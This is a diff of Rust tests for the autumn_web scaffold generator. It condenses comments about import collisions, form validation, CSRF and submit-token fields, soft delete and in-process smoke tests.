-        // duplicate `SubmitToken`/`SubmitFormField` import fails with E0252,
-        // exactly like the `CsrfToken`/`Changeset` collisions above. Rejecting
-        // the field up front yields the actionable field-name error instead of a
-        // broken generated file.
+        // These pascalize to `SubmitToken` / `SubmitFormField`, colliding with the
+        // `use autumn_web::security::{…}` import in every non-`--api` routes file
+        // (#1360): E0252.
         for field_name in ["submit_token", "submit_form_field"] {
             let tmp = project_with_main(default_main());
             let err = plan_scaffold(
@@ -16582,11 +14723,8 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_field_colliding_with_generated_form_struct_is_rejected() {
-        // `post_form:enum{a,b}` on model `Post` pascalizes to `PostForm`,
-        // colliding with the scaffold's own generated `pub struct PostForm`
-        // changeset form (`render_model_form`, issue #1124) — a duplicate
-        // `PostForm` definition fails to compile, exactly like the
-        // fixed-name collisions above.
+        // `post_form` on model `Post` pascalizes to `PostForm`, colliding with the
+        // generated `pub struct PostForm` changeset form (#1124).
         let tmp = project_with_main(default_main());
         let err = plan_scaffold(
             tmp.path(),
@@ -16618,15 +14756,9 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_field_named_redirect_is_accepted_and_routes_fully_qualify_redirect() {
-        // Regression (PR #1659): the routes file's write handlers issue real 303
-        // redirects. If the file imported the framework type via
-        // `use autumn_web::Redirect;`, a `redirect:enum{a,b}` field — which
-        // pascalizes to `Redirect` and is imported via
-        // `use crate::models::post::{…, Redirect}` — would produce two `Redirect`
-        // imports and fail with E0252. `Redirect` is deliberately NOT reserved
-        // (users may name a model/enum `Redirect`); instead the handlers
-        // fully-qualify the framework type as `autumn_web::Redirect`, so the enum
-        // field is accepted and both types coexist.
+        // `Redirect` is not reserved (users may name an enum `Redirect`), so the
+        // handlers fully-qualify `autumn_web::Redirect` instead of importing it;
+        // an import would collide with the model's `Redirect` enum (E0252).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -16638,14 +14770,10 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // The model-side `Redirect` enum is imported — this is the type that
-        // would have collided with a framework `use autumn_web::Redirect;`.
         assert!(
             routes.contains("Redirect}"),
             "expected the enum `Redirect` to be imported from crate::models: {routes}"
         );
-        // The framework redirect is fully-qualified, never imported, so there is
-        // no duplicate import and no glob-shadowing.
         assert!(
             !routes.contains("use autumn_web::Redirect;"),
             "routes must not import the framework Redirect (would collide): {routes}"
@@ -16678,8 +14806,7 @@ async fn main() {
 
     #[test]
     fn scaffold_nullable_enum_create_form_has_unset_placeholder() {
-        // A nullable enum renders through `select_input` with an "— Unset —"
-        // placeholder as its blank option (issue #1124).
+        // A nullable enum's select gets an "— Unset —" blank option (#1124).
         let tmp = project_with_main(default_main());
         plan_and_execute_post_scaffold_with_nullable_status_enum(&tmp);
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
@@ -16695,7 +14822,7 @@ async fn main() {
     #[test]
     fn scaffold_nullable_enum_edit_form_seed_maps_option_variant() {
         // The `From<&Post>` seed maps `Option<Status>` to an `Option<String>`
-        // token; `select_input` then marks the matching option (issue #1124).
+        // token so the select marks the matching option (#1124).
         let tmp = project_with_main(default_main());
         plan_and_execute_post_scaffold_with_nullable_status_enum(&tmp);
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
@@ -16748,11 +14875,9 @@ async fn main() {
         assert!(routes.contains("csrf_field: Option<CsrfFormField>"));
         assert!(routes.contains("(csrf_input(csrf.as_ref(), csrf_field.as_ref()))"));
         assert!(routes.contains("pub async fn edit_form("));
-        // Issue #1360: one-time submit token embedded in create/update forms and
-        // threaded through the create/update handlers. The hidden field's `name`
-        // is bound at runtime to the configured `security.submit_token.field_name`
-        // (via the `SubmitFormField` extractor), not hardcoded — mirroring CSRF —
-        // so a custom field name still matches what `SubmitTokenLayer` scans for.
+        // #1360: the submit token's hidden field name comes from the configured
+        // `security.submit_token.field_name` at runtime, so a custom name still
+        // matches what `SubmitTokenLayer` scans for.
         assert!(routes.contains("fn submit_token_input("));
         assert!(routes.contains(
             "let submit_field_name = field.map(|field| field.0.as_str()).unwrap_or(\"_submit_token\");"
@@ -16760,18 +14885,14 @@ async fn main() {
         assert!(routes.contains(
             "input type=\"hidden\" name=(submit_field_name) value=(submit_token.token());"
         ));
-        // The hidden field is never emitted under a hardcoded `_submit_token` name.
         assert!(!routes.contains("name=\"_submit_token\""));
         assert!(routes.contains("submit_token: Option<SubmitToken>"));
         assert!(routes.contains("submit_field: Option<SubmitFormField>"));
         assert!(routes.contains("submit_token.as_ref()"));
         assert!(routes.contains("submit_field.as_ref()"));
         assert!(routes.contains("submit_token_input(submit_token, submit_field)"));
-        // Issue #1360 (finding G): the token must be emitted at the FRONT of the
-        // form via `.prepend(...)`, not appended after the derived fields —
-        // `SubmitTokenLayer` only scans the first chunk of the URL-encoded body,
-        // so a large earlier field could otherwise push an appended token past
-        // the scan cap and leave duplicate submits unguarded.
+        // `SubmitTokenLayer` scans only the start of the body, so the token is
+        // prepended: after a large field it could fall past the scan cap.
         assert!(
             routes.contains("form.prepend(submit_token_input(submit_token, submit_field))"),
             "standard form must prepend the submit token, not append it:\n{routes}"
@@ -16784,12 +14905,9 @@ async fn main() {
 
     // ── Changeset validation round-trip (issue #1124) ──────────────────
     //
-    // A rejected submission must re-render the same form at HTTP 422 with the
-    // user's input preserved and per-field errors shown inline, instead of the
-    // old decode-and-insert path that landed on a 400 error page with input
-    // lost. The generator promotes the internal decode struct to a public,
-    // validating `{Pascal}Form` (derives Serialize + validator::Validate +
-    // Default), and the handlers build a `Changeset` from it.
+    // A rejected submission re-renders the form at 422 with the input kept and
+    // per-field errors inline. Handlers build a `Changeset` from a public
+    // `{Pascal}Form` (Serialize + Validate + Default).
 
     #[test]
     fn execute_writes_model_form_struct() {
@@ -16858,7 +14976,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // AC1: handlers build a changeset from the submitted body.
         assert!(
             routes.contains("into_changeset()"),
             "create/update must build a changeset from the submission: {routes}"
@@ -16867,15 +14984,12 @@ async fn main() {
             routes.contains("is_valid()"),
             "handler must branch on changeset validity: {routes}"
         );
-        // AC2: failed submission re-renders at 422, not a 400 error page.
         assert!(
             routes.contains("StatusCode::UNPROCESSABLE_ENTITY"),
             "handler must respond 422 on a rejected submission: {routes}"
         );
-        // AC7: the create/update handlers re-render at 422 rather than
-        // dead-ending on a rejected submission. (A truly undecodable body still
-        // 400s in `decode_form`, matching ChangesetForm's own contract — the
-        // 422 path is exclusively for validator-rule failures.)
+        // Only validator failures take the 422 path; an undecodable body still
+        // 400s in `decode_form`.
         assert!(
             routes.contains("into_response()"),
             "the changeset re-render returns a Response, not a bare Markup 400: {routes}"
@@ -16907,11 +15021,8 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Issue #1135: new/edit render the whole form through one shared
-        // `form_for` helper — control selection per column (text/number/
-        // checkbox/datetime, required or not) lives in the derived
-        // `FormModel` descriptors, so the routes file carries no per-field
-        // input lines at all.
+        // #1135: new/edit render through one `form_for` helper; per-column
+        // control choice lives in the derived `FormModel` descriptors.
         let new_form_start = routes
             .find("pub async fn new_form")
             .expect("new_form handler");
@@ -16943,7 +15054,6 @@ async fn main() {
                 "no per-field {helper} lines may remain: {routes}"
             );
         }
-        // The old hand-rolled bare-HTML text input must be gone for standard fields.
         assert!(
             !routes.contains(r#"input type="text" name="title""#),
             "standard fields must no longer be hand-rolled: {routes}"
@@ -16952,17 +15062,12 @@ async fn main() {
 
     #[test]
     fn execute_live_validation_inline_posts_drop_the_submit_token() {
-        // Finding F (issue #1360): a `--live-validation` field posts its inline
-        // validation with `hx-include="closest form"`, so that POST would carry
-        // the hidden one-time `_submit_token` to the guarded `/validate/...`
-        // route and consume it — the real create submit would then replay the
-        // validation fragment instead of running the mutation. The generated
-        // htmx input must drop the token via `hx-params="not _submit_token"`,
-        // while the real create/update form still embeds it.
+        // #1360: inline validation posts with `hx-include="closest form"`, which
+        // would send the one-time `_submit_token` to `/validate/...` and consume
+        // it, so the real submit would replay the fragment. The input drops it via
+        // `hx-params="not _submit_token"`.
         let tmp = project_with_main(default_main());
-        // A DSL-constrained `String` auto-derives a `length` rule, so `title` is
-        // validated and renders through the typed `a11y::TextField` primitive
-        // carrying the htmx wiring via `.hx()` (issue #1951).
+        // The DSL constraint derives a `length` rule, so `title` is validated.
         let plan = plan_scaffold_with_options(
             tmp.path(),
             "Post",
@@ -16978,21 +15083,15 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // The constrained validated input keeps its inline-validation wiring,
-        // now threaded through the primitive's `.hx()` escape hatch and the
-        // typed path helper (#1823/#1951) rather than a raw `hx-post` attribute.
         assert!(
             routes.contains(".hx(\"post\", paths::validate_title())"),
             "title must keep its htmx inline-validation wiring via `.hx()`:\n{routes}"
         );
-        // ...but filters the one-time submit token out of that POST so the
-        // inline validation never consumes it.
         assert!(
             routes.contains(".hx(\"params\", \"not _submit_token\")"),
             "live-validation inputs must drop _submit_token from the inline POST:\n{routes}"
         );
-        // The inline-validate handler returns the SAME fragment (byte-identical
-        // for the htmx `outerHTML` swap), so it must carry the filter too.
+        // The validate handler returns the same fragment, so it carries the filter too.
         let validate_title = &routes[routes
             .find("pub async fn validate_title(")
             .expect("validate_title handler")..];
@@ -17003,21 +15102,14 @@ async fn main() {
                 .contains(".hx(\"params\", \"not _submit_token\")"),
             "the validate_title fragment must also drop the submit token:\n{validate_title}"
         );
-        // The real create/update form still embeds the submit token so the
-        // mutation stays guarded against duplicate submits.
         assert!(
             routes.contains("submit_token_input(submit_token.as_ref(), submit_field.as_ref())"),
             "the create/update form must still carry the submit token:\n{routes}"
         );
 
-        // Issue #1951 byte-identity guarantee: htmx swaps `outerHTML` on the
-        // whole `[data-autumn-field-wrapper]`, so the field the form first
-        // renders and the fragment the `validate_title` handler returns must be
-        // byte-identical. Both are emitted by the shared
-        // `render_live_constrained_field`, so extract the `title-field` wrapper
-        // block from the first (form) occurrence and from the validate handler
-        // and assert they match after normalizing insignificant leading
-        // whitespace (which maud does not render).
+        // #1951: htmx swaps `outerHTML` on the field wrapper, so the form's field
+        // and the `validate_title` fragment must match. Compare the two
+        // `title-field` blocks with leading whitespace trimmed (maud drops it).
         let extract_block = |src: &str, start: usize| -> String {
             let open = src[start..].find('{').expect("wrapper `{`") + start;
             let mut depth = 0usize;
@@ -17075,9 +15167,7 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Prefilling on the edit form now flows through the changeset: the
-        // `From<&Post>` seed copies each row value into the form, and the
-        // changeset-aware helpers repopulate the `value` (issue #1124).
+        // The edit form is prefilled through a changeset seeded by `From<&Post>` (#1124).
         assert!(
             routes.contains("impl From<&Post> for PostForm"),
             "edit form must seed a changeset from the loaded row: {routes}"
@@ -17094,9 +15184,8 @@ async fn main() {
             routes.contains("views: row.views.clone(),"),
             "seed must copy nullable numeric fields from the loaded row: {routes}"
         );
-        // The nullable numeric control itself comes from the derived
-        // `FormModel` descriptors (Option<i64> → non-required number input);
-        // the routes file needs no per-field code or override for it.
+        // The derived `FormModel` descriptors already render `Option<i64>` as an
+        // optional number input.
         assert!(
             !routes.contains(".override_field(\"views\""),
             "plain numeric fields need no form_for override: {routes}"
@@ -17126,9 +15215,8 @@ async fn main() {
             routes.contains("use autumn_web::reexports::axum::body::Bytes;"),
             "generated routes must be able to inspect raw form bytes: {routes}"
         );
-        // Issue #1830: no-owner scaffolds now also record-authorize their
-        // mutating handlers, so `State`/`Session` are threaded in before the
-        // body-consuming `Bytes` extractor (which stays last).
+        // #1830: mutating handlers record-authorize, so they take `State` and
+        // `Session`; the body-consuming `Bytes` extractor must stay last.
         assert!(
             routes.contains("pub async fn create(flash: Flash, csrf: Option<CsrfToken>, csrf_field: Option<CsrfFormField>, submit_token: Option<SubmitToken>, submit_field: Option<SubmitFormField>, mut db: Db, \n    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,\n    session: autumn_web::session::Session,\n    body: Bytes)"),
             "create must decode after blank nullable normalization: {routes}"
@@ -17139,8 +15227,6 @@ async fn main() {
             ),
             "update must decode after blank nullable normalization: {routes}"
         );
-        // Both handlers decode to the form via the generated decoder, then
-        // validate through a changeset (issue #1124).
         assert!(
             routes.contains("let form = decode_form(body)?;"),
             "handlers must use the generated decoder: {routes}"
@@ -17204,8 +15290,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Flash (and the shared flash_messages helper) is imported and set on
-        // every mutating action before the redirect.
         assert!(
             routes.contains("use autumn_web::flash::{Flash, flash_messages};"),
             "routes file must import Flash and flash_messages: {routes}"
@@ -17213,14 +15297,12 @@ async fn main() {
         assert!(routes.contains(r#"flash.success("Post created")"#));
         assert!(routes.contains(r#"flash.success("Post updated")"#));
         assert!(routes.contains(r#"flash.success("Post deleted")"#));
-        // A destroy handler now exists, wired as a browser-friendly POST.
+        // Destroy is a POST so a plain HTML form can reach it.
         assert!(routes.contains("pub async fn destroy("));
         assert!(routes.contains(r#"#[post("/posts/{id}/delete", name = "delete")]"#));
-        // The edit page exposes a delete control that targets it, through the
-        // typed path helper (issue #1133).
+        // The edit page's delete control uses the typed path helper (#1133).
         assert!(routes.contains("paths::delete(*id)"));
-        // Issue #1130: the standard scaffold no longer emits a private layout
-        // stub — every view renders through the app's shared `crate::layout`.
+        // #1130: views render through the app's shared `crate::layout`.
         assert!(
             !routes.contains("fn layout(title: &str, flash: Markup, content: Markup)"),
             "standard scaffold must not define a private layout stub: {routes}"
@@ -17233,8 +15315,7 @@ async fn main() {
             routes.contains("crate::layout("),
             "views must render through the shared crate::layout: {routes}"
         );
-        // Issue #1240: flash renders through the shared accessible helper, not
-        // the older `flash.render()`.
+        // #1240: flash renders through the shared accessible helper.
         assert!(
             !routes.contains("flash.render().await"),
             "flash must not use the old flash.render() path: {routes}"
@@ -17244,7 +15325,6 @@ async fn main() {
             "flash must render through the shared flash_messages() helper: {routes}"
         );
 
-        // main.rs registers the new destroy route.
         let main = fs::read_to_string(tmp.path().join("src/main.rs")).unwrap();
         assert!(
             main.contains("routes::posts::destroy"),
@@ -17271,7 +15351,6 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // No private layout definition survives (AC 1/3/6).
         assert!(
             !routes.contains("fn layout("),
             "no private layout may be defined in the routes file: {routes}"
@@ -17281,8 +15360,6 @@ async fn main() {
             "the private-layout doc comment must be gone: {routes}"
         );
 
-        // Every view renders through the shared layout with a 4-arg call
-        // supplying a `current_path` (AC 1/2).
         assert!(
             routes.contains(
                 "crate::layout(\"Post index\", \"/posts\", flash_messages(&flash.consume().await),"
@@ -17310,8 +15387,7 @@ async fn main() {
     #[test]
     fn scaffold_create_update_render_flash_via_shared_helper() {
         let tmp = project_with_main(default_main());
-        // A `unique` field forces the create/update 422 re-render branches to
-        // splice the shared form body, exercising the write-path flash arg.
+        // A `unique` field adds the create/update 422 re-render branches.
         let plan = plan_scaffold(
             tmp.path(),
             "Post",
@@ -17330,8 +15406,6 @@ async fn main() {
             !routes.contains("flash.render()"),
             "no view may use the older flash.render(): {routes}"
         );
-        // The create and update handlers both re-render the form on the 422
-        // path; that shared body must carry the shared helper call.
         let occurrences = routes
             .matches("flash_messages(&flash.consume().await)")
             .count();
@@ -17402,8 +15476,6 @@ async fn main() {
             &ScaffoldOptions::default(),
         )
         .expect("destroy scaffold must build its revert plan without a shared layout");
-        // Sanity: it still plans the HTML routes file a normal scaffold would, so
-        // `Plan::revert` has something to remove.
         assert!(
             plan.actions.iter().any(|a| {
                 a.path()
@@ -17415,8 +15487,8 @@ async fn main() {
             "revert plan should still include the HTML routes file it will remove"
         );
 
-        // And the generate path over the SAME project still fails fast — the
-        // guard is bypassed only for revert, never weakened for generation.
+        // The layout guard is bypassed only for revert: generating over the same
+        // project still fails.
         let err = plan_scaffold(
             tmp.path(),
             "Post",
@@ -17449,8 +15521,6 @@ async fn main() {
             },
         )
         .expect("live scaffold is self-contained and needs no shared layout");
-        // The live scaffold still emits an HTML routes file — it just renders
-        // through its own private layout, not `crate::layout`.
         assert!(
             plan.actions.iter().any(|a| {
                 a.path()
@@ -17681,22 +15751,18 @@ async fn main() {
 
     #[test]
     fn smoke_test_emits_write_path_crud_and_validation_rerender() {
-        // Issue #1127: the generated suite must exercise create/update/delete
-        // AND the validation-failure re-render, not just the read index — even
-        // for a resource that declares no `--validate` rules of its own (the
-        // write-path stand-in carries its own validated field).
+        // #1127: the write path and the validation re-render are covered even
+        // with no `--validate` rules; the stand-in carries its own validated field.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(tmp.path(), "Post", &[], "20260427000000").unwrap();
         plan.execute(Flags::default()).unwrap();
         let test = fs::read_to_string(tmp.path().join("tests/post.rs")).unwrap();
 
-        // The write-path test function is present.
         assert!(
             test.contains("async fn posts_write_path_crud()"),
             "write-path CRUD test must be emitted: {test}"
         );
 
-        // Create (happy path): POST that redirects (303) to the index route.
         assert!(
             test.contains(".post(\"/posts\")"),
             "must POST to the create route: {test}"
@@ -17710,20 +15776,16 @@ async fn main() {
             "redirects must be asserted to target the index route: {test}"
         );
 
-        // Update (happy path): POST to the `/update` route.
         assert!(
             test.contains(".post(\"/posts/1/update\")"),
             "must POST to the update route: {test}"
         );
 
-        // Delete: POST to the generated HTML `/delete` action (#1021).
         assert!(
             test.contains(".post(\"/posts/1/delete\")"),
             "must POST to the HTML delete action: {test}"
         );
 
-        // Validation failure: an invalid create re-renders at 422 with an inline
-        // error and the preserved input, and does NOT redirect.
         assert!(
             test.contains(".assert_status(422)"),
             "invalid create must re-render at 422: {test}"
@@ -17736,29 +15798,20 @@ async fn main() {
 
     #[test]
     fn write_path_smoke_test_emits_redirect_persist_and_validation_shapes() {
-        // String-shape check (this test does not itself run the emitted test):
-        // assert the emitted handlers carry the constructs that give the
-        // generated test its failure power — a real redirect (not a 200
-        // meta-refresh), a cross-request store the create/update/delete mutate,
-        // a validation gate, and row-count reads. A broken generated handler
-        // (200 instead of a redirect, a no-op delete, a create that skips
-        // validation) would then turn the generated test red at runtime; that
-        // runtime red-spike is exercised by
-        // `generated_validated_scaffold_round_trip_test_passes` in
-        // `tests/generate.rs`.
+        // Checks only the emitted text: the constructs that let the generated test
+        // fail on a broken handler. `tests/generate.rs`
+        // (`generated_validated_scaffold_round_trip_test_passes`) runs it.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(tmp.path(), "Post", &[], "20260427000000").unwrap();
         plan.execute(Flags::default()).unwrap();
         let test = fs::read_to_string(tmp.path().join("tests/post.rs")).unwrap();
 
-        // A real redirect response (303 See Other via `Redirect::to`), not a
-        // 200 meta-refresh page — so `assert_status(303)` has teeth.
+        // A real 303, not a 200 meta-refresh, so `assert_status(303)` can fail.
         assert!(
             test.contains("Redirect::to(\"/posts\")"),
             "create/update/delete stand-ins must issue a real redirect: {test}"
         );
-        // A real, cross-request store so persistence is observable on re-read —
-        // the create pushes, update mutates, delete removes.
+        // A cross-request store makes persistence observable on re-read.
         assert!(
             test.contains("STORE.lock().unwrap()"),
             "handlers must read/write the shared store so persistence is observable: {test}"
@@ -17767,13 +15820,10 @@ async fn main() {
             test.contains("store.push(") && test.contains(".retain("),
             "create must persist and delete must remove from the store: {test}"
         );
-        // The create actually gates on validation (the 422 branch is reachable).
         assert!(
             test.contains("form.into_valid()"),
             "create must validate the submission through the real changeset round-trip: {test}"
         );
-        // The follow-up read proves the row count changed (persist / delete),
-        // not just that a status code came back.
         assert!(
             test.contains(".assert_body_contains(\"1 row(s)\")")
                 && test.contains(".assert_body_contains(\"0 row(s)\")"),
@@ -17783,10 +15833,8 @@ async fn main() {
 
     #[test]
     fn write_path_smoke_test_emits_csrf_posture_note() {
-        // Issue #1127: the write-path tests must account for CSRF. `TestApp`
-        // disables CSRF by default (mirroring the real form_for-injected token
-        // that the in-process harness does not require), and the emitted test
-        // documents that so the missing `_csrf` field is intentional, not a bug.
+        // `TestApp` disables CSRF by default; the emitted test says so, so the
+        // missing `_csrf` field reads as intentional (#1127).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(tmp.path(), "Post", &[], "20260427000000").unwrap();
         plan.execute(Flags::default()).unwrap();
@@ -17806,7 +15854,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
         let test = fs::read_to_string(tmp.path().join("tests/post.rs")).unwrap();
 
-        // Uses the real in-process harness -- no raw sockets, no env-var gate.
         assert!(
             test.contains("autumn_web::test::{TestApp, TestClient, TestDb}"),
             "smoke test must use the TestApp/TestClient/TestDb harness: {test}"
@@ -17824,24 +15871,20 @@ async fn main() {
             "smoke test must not silently skip via an env-gated return: {test}"
         );
 
-        // DB-backed handler: a Docker-backed test is a *visible* `ignored`,
-        // never a silent green pass, and carries an explicit reason.
+        // A Docker-backed test shows as `ignored`, never as a silent pass.
         assert!(
             test.contains("#[ignore = \"requires Docker"),
             "DB-backed smoke test must be explicitly #[ignore]d with a reason: {test}"
         );
 
-        // Real assertions: 200 plus the rendered heading.
         assert!(test.contains(".assert_ok()"));
         assert!(test.contains(".assert_body_contains(\"Posts\")"));
     }
 
     #[test]
     fn smoke_test_index_handler_returns_wrong_status_fails_the_assertion() {
-        // Red-phase spike: if the (re-declared) handler under test returned the
-        // wrong status or dropped the heading, `assert_ok`/`assert_body_contains`
-        // must be the thing that fails -- i.e. the test has real failure power,
-        // not just a status check that always trivially passes.
+        // The handler renders real Markup and queries the DB, so a wrong status
+        // or missing heading makes `assert_ok`/`assert_body_contains` fail.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(tmp.path(), "Post", &[], "20260427000000").unwrap();
         plan.execute(Flags::default()).unwrap();
@@ -17855,9 +15898,7 @@ async fn main() {
             test.contains("h1 { \"Posts\" }"),
             "handler must render the heading the test asserts on: {test}"
         );
-        // The count query touches the real (throwaway) database -- a broken
-        // query or handler bubbles up as an Err via `?`, which axum turns into
-        // a non-200 response, which `assert_ok()` then catches.
+        // A failing query propagates via `?` as a non-200, which `assert_ok()` catches.
         assert!(test.contains(".get_result(&mut db).await?;"));
     }
 
@@ -17875,7 +15916,6 @@ async fn main() {
             cargo.contains("test-support"),
             "Cargo.toml must enable autumn-web's test-support feature for TestDb: {cargo}"
         );
-        // Must not leak into the production dependency set.
         let deps_section = cargo.split("[dev-dependencies]").next().unwrap();
         assert!(
             !deps_section.contains("test-support"),
@@ -17885,13 +15925,9 @@ async fn main() {
 
     #[test]
     fn destroying_the_only_scaffold_keeps_pre_existing_test_support_another_test_still_uses() {
-        // issue #1048 PR review: a project may already have `autumn-web`
-        // under `[dev-dependencies]` with `test-support` enabled for its
-        // OWN hand-written tests, independent of any scaffold.
-        // `ensure_dev_dependency_test_support` makes no Cargo.toml edit in
-        // that case, but the revert is still recorded unconditionally —
-        // must not strip `test-support` out from under that unrelated test
-        // when destroying the only scaffold.
+        // #1048: `test-support` was already enabled for a hand-written test, so
+        // the scaffold made no Cargo.toml edit. Its revert is still recorded and
+        // must not strip the feature.
         let tmp = project_with_main(default_main());
         fs::write(
             tmp.path().join("Cargo.toml"),
@@ -17921,13 +15957,9 @@ async fn main() {
 
     #[test]
     fn smoke_test_wires_dev_dependency_tokio_test_features() {
-        // Regression test (Codex review, issue #1023): the generated smoke
-        // test uses `#[tokio::test]`, which needs the `rt` and `macros`
-        // tokio features to compile. A project not created from `autumn
-        // new` -- like this test's bare Cargo.toml -- has no tokio
-        // dev-dependency at all, so without this wiring the generated test
-        // target would fail to compile (cargo test --tests still compiles
-        // #[ignore]d tests).
+        // #1023: `#[tokio::test]` needs tokio's `rt` and `macros`. A project not
+        // made by `autumn new` has no tokio dev-dependency, and `#[ignore]`d
+        // tests still compile.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(tmp.path(), "Post", &[], "20260427000000").unwrap();
         plan.execute(Flags::default()).unwrap();
@@ -17954,8 +15986,6 @@ async fn main() {
         .unwrap();
         plan.execute(Flags::default()).unwrap();
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // The delete button must require an explicit confirmation so a single
-        // misclick cannot silently destroy a row (AC: destructive confirmation).
         assert!(
             routes.contains(r#"onclick="return confirm("#) || routes.contains("hx-confirm="),
             "delete button must have an onclick confirm or hx-confirm: {routes}"
@@ -17964,13 +15994,8 @@ async fn main() {
 
     #[test]
     fn smoke_test_write_path_stays_in_process_never_over_a_socket() {
-        // The old create/delete round-trip test hit a *running server* over a
-        // raw TcpStream, gated on `AUTUMN_TEST_BASE_URL` -- the very
-        // false-positive-green pattern issue #1023 fixed. Issue #1127 restores
-        // write-path coverage (create -> redirect, update, delete, plus the
-        // validation-failure re-render) but it must stay in-process via the
-        // `TestApp`/`TestClient` harness -- never the old socket-based,
-        // env-gated, silently-skipping shape.
+        // Write-path tests (#1127) run in-process through `TestApp`, never over
+        // a socket gated on an env var that silently skips when unset (#1023).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -17981,7 +16006,6 @@ async fn main() {
         .unwrap();
         plan.execute(Flags::default()).unwrap();
         let test = fs::read_to_string(tmp.path().join("tests/post.rs")).unwrap();
-        // None of the old false-positive-green machinery may come back.
         assert!(
             !test.contains("TcpStream"),
             "write-path tests must not hand-roll a raw TCP request: {test}"
@@ -17990,9 +16014,6 @@ async fn main() {
             !test.contains("AUTUMN_TEST_BASE_URL"),
             "write-path tests must not gate on a running server's base URL: {test}"
         );
-        // The write-path suite is present and in-process alongside the read one:
-        // the index/read test, the write-path CRUD test, and (issue #1315) the
-        // CSV download test.
         assert_eq!(
             test.matches("#[tokio::test]").count(),
             3,
@@ -18021,7 +16042,6 @@ async fn main() {
     #[test]
     fn collision_lists_existing_files_without_force() {
         let tmp = project_with_main(default_main());
-        // Pre-create one of the files so the next run collides.
         let dir = tmp.path().join("src/models");
         fs::create_dir_all(&dir).unwrap();
         fs::write(dir.join("post.rs"), "// existing").unwrap();
@@ -18053,8 +16073,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // The browser delete button must respect soft-delete: mark deleted_at,
-        // matching the soft-delete repository, instead of physically deleting.
         assert!(
             routes.contains("posts::deleted_at.eq(Some(chrono::Utc::now().naive_utc()))"),
             "soft-delete destroy must mark deleted_at: {routes}"
@@ -18142,24 +16160,15 @@ async fn main() {
             model.contains("deleted_at"),
             "model struct must include deleted_at field when soft_delete is enabled: {model}"
         );
-        // Regression test: `deleted_at` must be excluded from `NewX`/`UpdateX`
-        // via `#[default]` -- it's DB-managed (NULL on insert, set only by the
-        // destroy handler), so neither the create nor update handler ever
-        // populates it. Without `#[default]` here, `#[model]` treats it as a
-        // required field and the generated `create` handler fails to compile
-        // (`NewPost { .. }` missing `deleted_at`).
+        // `deleted_at` is set only by destroy. Without `#[default]`, `#[model]`
+        // makes it required and `NewPost { .. }` in `create` fails to compile.
         assert!(
             model.contains("#[default]\n    pub deleted_at:"),
             "deleted_at must be #[default] (DB-managed, excluded from NewX/UpdateX): {model}"
         );
-        // Regression test: the model struct's field order must match the
-        // column order `create_table_sql_with_metadata_and_id`/
-        // `schema_table_block_with_id` emit for the migration and
-        // `schema.rs` (soft-delete field before `created_at`, which is
-        // always appended last). The `#[repository]` macro's generated
-        // insert-then-`RETURNING` query loads into this struct positionally,
-        // so a mismatched order produces a Diesel `CompatibleType` error at
-        // compile time rather than at the point of the actual typo.
+        // `RETURNING` rows load into the struct positionally, so field order must
+        // match the migration and `schema.rs` (`created_at` last), or Diesel fails
+        // with a `CompatibleType` error.
         let deleted_at_pos = model.find("pub deleted_at:").expect("deleted_at field");
         let created_at_pos = model.find("pub created_at:").expect("created_at field");
         assert!(
@@ -18178,10 +16187,8 @@ async fn main() {
 
     #[test]
     fn scaffold_soft_delete_smoke_test_table_includes_deleted_at() {
-        // Regression test (code review, issue #1023): the smoke test's
-        // throwaway CREATE TABLE must use the same soft-delete-augmented field
-        // list as the real migration, so it doesn't drift from the actual
-        // schema for --soft-delete models.
+        // #1023: the smoke test's throwaway CREATE TABLE must match the real
+        // migration, including the soft-delete column.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -18249,11 +16256,8 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Issue #1236: attachments upload with zero JavaScript via a plain
-        // `multipart/form-data` submit. The attachment is promoted to
-        // `FieldControl::File`, which renders a plain `<input type="file">`
-        // (no `.exclude` + hand-rolled append, no hidden key input) and flips
-        // the `form_for` `<form>` to `multipart/form-data`.
+        // #1236: attachments upload with no JavaScript. `FieldControl::File`
+        // renders `<input type="file">` and makes the form `multipart/form-data`.
         assert!(
             routes.contains(".override_field(\"avatar\", autumn_web::form::FieldControl::File)"),
             "{routes}"
@@ -18266,9 +16270,7 @@ async fn main() {
             "no hidden presign-key input any more: {routes}"
         );
 
-        // The create/update handlers take a Multipart body (last param) and
-        // stream file parts to the blob store — no `body: Bytes`, no presign
-        // dead-end (`complete_direct_upload`) in the default path.
+        // Create/update stream file parts from a `Multipart` body to the blob store.
         assert!(
